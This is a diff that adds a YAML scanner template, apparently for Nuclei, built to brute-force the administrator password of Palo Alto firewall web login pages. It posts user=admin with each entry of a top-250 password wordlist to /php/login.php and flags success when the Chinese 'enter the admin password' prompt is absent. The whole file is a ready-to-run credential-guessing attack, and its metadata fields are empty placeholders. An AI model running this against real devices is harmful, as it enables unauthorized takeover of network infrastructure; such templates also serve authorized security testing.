@@ -1,0 +1,47 @@
+id: login-fuzz-paloalto
+
+info:
+  name: login-fuzz-paloalto
+  author: capiton
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: loginfuzz
+
+requests:
+  - raw:
+      - |-
+        POST /php/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 109
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+
+        prot=&server=&authType=init&challengeCookie=&user=admin&passwd={{password}}&challengePwd=&ok=%E7%99%BB%E5%BD%95
+    attack: clusterbomb
+    stop-at-first-match: true
+    payloads:
+      password: "helpers/wordlists/password-TOP250"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<td id="spChallengeMsg">输入管理用户界面的密码'
+        negative: true
+      - type: status
+        status:
+          - 200
